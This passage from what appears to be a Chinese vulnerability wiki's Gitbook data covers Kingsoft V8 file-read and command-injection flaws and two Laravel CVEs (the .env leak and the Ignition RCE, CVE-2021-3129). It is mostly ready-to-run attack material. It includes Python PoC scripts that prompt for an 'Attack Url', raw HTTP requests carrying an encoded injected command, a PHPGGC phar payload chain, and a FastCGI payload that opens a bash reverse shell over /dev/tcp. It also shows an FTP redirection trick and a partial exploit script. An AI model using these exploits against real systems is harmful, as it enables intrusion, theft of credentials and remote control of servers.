requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 金山 V8 终端安全系统 任意文件读取漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/htmltopdf/downfile.php?filename=downfile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"$filename\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞 , 响应为:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 Arbitrary file read 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/金山/金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞.html":{"url":"book/Web应用漏洞/金山/金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞.html","title":"金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞","keywords":"","body":"金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞 漏洞描述 金山 V8 终端安全系统 pdf_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令 漏洞影响 [!NOTE] 金山 V8 终端安全系统 FOFA [!NOTE] app=\"猎鹰安全-金山V8+终端安全系统\" 漏洞复现 存在漏洞的文件为 Kingsoft\\Security Manager\\SystemCenter\\Console\\inter\\pdf_maker.php array(\"set_exportpdf_cmd\"=>array( \"url\"=>\"http://172.18.254.146/report/system/main.php?userSession=5784727B-7AEA-4EFE-B0CB-DDD6DA1CABD3&guid=1AC380D9-580C-49A8-B6EC-787CF50FA928&VHierarchyID=ADMIN\", \"fileName\"=>\"test1234.pdf\" ) )); */ $url = $_POST[\"url\"]; $fileName = $_POST[\"fileName\"]; $batName=$fileName; if ($url == null || $fileName == null) { $return[\"nResult\"] = __LINE__; echo json_encode($return,JSON_UNESCAPED_UNICODE); return ; } $url = base64_decode($url); $nameStr = base64_decode($fileName).date(\"Y-m-d\").\".pdf\"; $fileName=\"..\\\\htmltopdf\\\\\".$nameStr; system('mkdir ..\\\\htmltopdf'); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url.'\" '.$fileName; if (getApacheVersion()>=24) { //apache 2.4 php 7 版本 只能在 bat中运行 $cmd =\" del \".$fileName; exec($cmd); $url_= str_replace('%','%%', $url); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url_.'\" '.$fileName; $batName =\"exec_wkhtmltopdf.bat\"; $myfile = fopen($batName , \"w\"); //$cmd =iconv(\"UTF-8\", \"gbk\", $cmd ); fwrite($myfile, $cmd); fclose($myfile); $cmd =$batName ; exec($cmd); $cmd =\" del \".$batName; exec($cmd); }else { system($cmd); } // echo $url; $return = array(\"nResult\" => \"0\",\"fileName\" =>$nameStr,\"url\"=>$url); echo json_encode($return,JSON_UNESCAPED_UNICODE); ?> 这里传入 base64加密的拼接命令即可执行任意命令 \"|| ipconfig || --base64--> url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx POST /inter/pdf_maker.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/inter/pdf_maker.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx\" try: response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Windows\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞 ,执行 ipconfig, 响应为:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 pdf_maker.php RCE 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/":{"url":"book/开发框架漏洞/","title":"开发框架漏洞","keywords":"","body":"开发框架漏洞🐇 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/Laravel/":{"url":"book/开发框架漏洞/Laravel/","title":"Laravel","keywords":"","body":"Laravel Laravel .env 配置文件泄露 CVE-2017-16894 Laravel 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/Laravel/Laravel .env 配置文件泄露 CVE-2017-16894.html":{"url":"book/开发框架漏洞/Laravel/Laravel .env 配置文件泄露 CVE-2017-16894.html","title":"Laravel .env 配置文件泄露 CVE-2017-16894","keywords":"","body":"Laravel .env 配置文件泄露 CVE-2017-16894 漏洞描述 Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。 Laravel framework 5.5.21及之前的版本中存在 .env 文件可被下载的信息泄露漏洞。远程攻击者可利用该漏洞获取敏感信息 漏洞影响 [!NOTE] Laravel framework FOFA [!NOTE] app=\"Laravel-Framework\" 漏洞复现 访问目标 url http://xxx.xxx.xxx.xxx/.env 当配置不当且在影响范围内时会出现 .env可被下载的情况，导致数据库账号密码等敏感信息的泄露 这里使用POC脚本来进行信息获取 漏洞利用POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Laravel framework >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"APP_NAME\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] .env 文件请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Laravel.env_configuration_file_leaks(CVE-2017-16894).json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发框架漏洞/Laravel/Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129.html":{"url":"book/开发框架漏洞/Laravel/Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129.html","title":"Laravel 小于 8.4.2 Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129","keywords":"","body":"Laravel 漏洞描述 Laravel 是一个免费的开源 PHP Web 框架，旨在实现的Web软件的MVC架构。2021年1月13日，阿里云应急响应中心监控到国外某安全研究团队披露了 Laravel 漏洞影响 [!NOTE] Laravel 框架 facade ignition 组件 环境搭建 https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d 点击生成密钥出现如下图即成功创建漏洞环境 漏洞复现 按照漏洞公开文章需要先有一个未知变量的错误，来点击 Make variable optional [!NOTE] 按照官方手册创建路由和View模板 通过点击“Make variableOptional”按钮，模板变量则会被修改。如果检查HTTP日志，我们就会看到被调用的端点 通过这些solutions，开发者可以通过点击按钮的方式，快速修复一些错误。本次漏洞就是其中的vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php过滤不严谨导致的。首先我们到执行solution的控制器当中去，看看是如何调用到solution的 getRunnableSolution(); $solution->run($request->get('parameters', [])); return response(''); } } 接着调用solution对象中的run()方法，并将可控的parameters参数传过去。通过这个点我们可以调用到MakeViewVariableOptionalSolution::run() makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } } 可以看到这里主要功能点是：读取一个给定的路径，并替换$variableName为$variableName ?? ''，之后写回文件中。由于这里调用了file_get_contents()，且其中的参数可控，所以这里可以通过phar://协议去触发phar反序列化。如果后期利用框架进行开发的人员，写出了一个文件上传的功能。那么我们就可以上传一个恶意phar文件，利用上述的file_get_contents()去触发phar反序列化，达到rce的效果。 除了解决方案的类名之外，还发送了一个文件路径和一个我们要替换的变量名。这看起来非常让人感兴趣。 让我们先检查一下类名的利用方法：我们可以实例化任意的类吗？ class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } 答案是否定的：Ignition总是用我们指向的类来实现RunnableSolution 那么，让我们仔细看看这个类。实际上，负责该操作的代码位./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.php文件中。那么，我们可以更改任意文件的内容么？ class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } 这段代码比我们预想的要复杂一些：它会在读取给定的文件路径[1]后，将$variableName替换为$variableName ?? ''，初始文件和新文件都将被标记化[2]。如果我们的代码结构没有发生超出预期的变化，文件将被替换为新的内容。否则，makeOptional将返回false[3]，新文件将不会被写入。因此，我们无法使用variableName做太多事情。 剩下的唯一输入变量就是viewFile。如果我们对variableName和它的所有用法进行抽象，我们最终会得到下面的代码片段： $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); 到目前为止，大家可能都听说过Orange Tsai演示的上传进度技术。该技术利用php://filter在返回文件之前修改其内容。借助于该技术，我们就可以通过漏洞利用原语来转换文件的内容 $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt'; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test 我们已经改变了文件的内容！遗憾的是，这将会应用两次转换。阅读文档后，我们找到了只进行一次转换的方法： # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt'; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt'; 坏字符甚至都会被忽略： $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt'; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test 默认情况下，Laravel的日志文件（存放PHP错误和堆栈跟踪）是存储在storage/log/laravel.log中的。下面，让我们通过尝试加载一个不存在的文件来生成一个错误, 即SOME_TEXT_OF_OUR_CHOICE： [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\"exception\":\"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \"} 我们可以向文件中注入（几乎）任意的内容了。理论上讲，我们可以使用Orange发明的技术将日志文件转换为有效的PHAR文件，然后，使用phar://包装器来运行序列化的代码。遗憾的是，这实际上是行不通的，并且原因有很多。 我们在前面说过，当对一个字符串进行ba se64-decoding处理时，PHP会忽略任何坏字符。这通常是正确的，但是有一个字符除外，即=。如果你使用ba se64-decode过滤一个中间含有字符=的字符串，PHP将产生一个错误，并且不会返回任何内容。 如果我们能控制整个文件，那就好了。然而，我们注入到日志文件中的文本只是其中很小的一部分。它不仅有一个不算很大的前缀（日期），还有一个臃肿的后缀（堆栈跟踪）。此外，我们注入的文本还出现了两次！ 下面是另一件可怕的事情： php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" 根据日期的不同，对前缀进行两次解码时，会得到不同大小的结果。当我们对它进行第三次解码时，在第二种情况下，我们的payload将以2作为前缀，从而需要改变base64消息的对齐方式。 为了使其正常运行，我们必须为每个目标建立一个新的payload，因为堆栈跟踪中包含绝对文件名；并且，每秒都需要建立一个新的payload，因为前缀中包含时间。并且，只要有一个字符=需要进行base64-decode处理，仍然会面临失败。 因此，我们回到PHP文档中寻找其他类型的过滤器。 [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] 遗憾的是，我们已经了解到，如果滥用base64-decode的话，可能会在某个时候失败。现在，让我们来利用这一点：如果我们滥用它，将发生解码错误，日志文件将被清除！这样，我们触发的下一个错误将单独存在于日志文件中： [prefix]PAYLOAD[midfix]PAYLOAD[suffix] 现在，我们又回到了最初的问题上：保留一个payload并删除其余的。幸运的是，php://filter并不限于base64操作。例如，我们可以用它来转换字符集，下面是从UTF-16到UTF-8的转换： echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠 我们的payload还在那里，安全无恙，只是前缀和后缀变成了非ASCII字符。然而，在日志条目中，我们的payload出现了两次，而不是一次。我们需要去掉第二个。 由于每个UTF-16字符占用两个字节，所以，我们可以通过在PAYLOAD的第二个实例的末尾增加一个字节，来使其无法对齐： echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠 这样做的好处是，前缀的对齐方式不再重要：如果前缀大小相等，第一个payload将被正确解码；否则的话，第二个payload就会被正确解码。 如果将上面的发现与前面的base64-decoding结合起来，就能够对我们想要的任何东西进行编码： $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! 说到对齐，如果日志文件本身不是2字节对齐的，转换过滤器将如何处理？ PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 这又是一个问题。不过，我们可以借助两个payload来轻松地解决这个问题：一个是无害的payload A，另一个是具有攻击性的payload B，具体如下所示： [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] 由于这里前缀、中缀和后缀都存在两份，还提供了payload_a和payload_b，所以，日志文件的大小必然是偶数，从而避免了错误的发生。 最后，我们还要解决最后一个问题：我们使用NULL字节将payload的字节从一个填充为两个。在PHP中试图加载一个带有NULL字节的文件时，会生成以下错误： PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 因此，我们将无法在错误日志中注入带有NULL字节的payload。幸运的是，最后一个过滤器可以帮到我们，它就是convert.quoted-printable-decode。 我们可以使用=00对NULL字节进行编码。 下面是我们最终的转换链： viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log 创建一个PHPGGC payload，并对其进行编码： php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 清空日志 viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log 创建第一个日志条目，用于对齐： viewFile: AA 创建带有payload日志条目： viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 通过我们的过滤器将日志文件转换为有效的PHAR： viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log 启动PHAR的反序列化过程： viewFile: phar:///path/to/storage/logs/laravel.log 利用FTP与PHP-FPM进行交互 由于我们可以运行file_get_contents来查找任何东西，因此，可以通过发送HTTP请求来扫描常用端口。结果发现，PHP-FPM似乎正在侦听端口9000。 众所周知，如果我们能向PHP-FPM服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但PHP却不支持。 另一个已知的允许通过TCP发送二进制数据包的协议是FTP，更准确的说是该协议的被动模式：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的一个端口，如果它愿意的话。 现在，如果我们尝试使用viewFile=ftp://evil-server.lexfo.fr/file.txt来利用这个漏洞，会发生以下情况： file_get_contents()连接到我们的FTP服务器，并下载file.txt。 file_put_contents()连接到我们的FTP服务器，并将其上传回file.txt。 您可能已经知道这是怎么回事：我们将使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000。 这样，我们就可以向PHP-FPM发送一个任意的数据包，从而执行代码。 利用这种方法，在我们的目标上成功地利用了该漏洞。 下面我们来演示一下攻击过程。 首先，我们使用gopherus生成攻击fastcgi的payload： python gopherus.py --exploit fastcgi /var/www/public/index.php # 这里输入的是目标主机上一个已知存在的php文件 bash -c \"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\" # 这里输入的是要执行的命令 得到payload，而我们需要的是上面payload中 _后面的数据部分，即： %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 将数据添加到如下FTP脚本中的payload(脚本在文章末尾和 POC目录中) 监听刚刚的反弹shell端口并运行 FTP脚本 发送请求反弹shell POST /_ignition/execute-solution HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 Content-Type: application/json Content-Length: 191 { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"ftp://aaa@xxx.xxx.xxx.xxx:23/123\" } } [!NOTE] 使用Docker环境无法复现，需要搭建另一个环境 漏洞利用POC https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests,json import sys,re proxies = { \"http\": '127.0.0.1:8080'} header={ \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\", \"Content-Type\":\"application/json\" } def clearlog(url): data = { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def AA(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": \"AA\" } } req=requests.post(url,headers=header,data=json.dumps(data,indent=1)) return req def sendpayloadwindows(url): data={ \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\":\"username\", \"viewFile\": 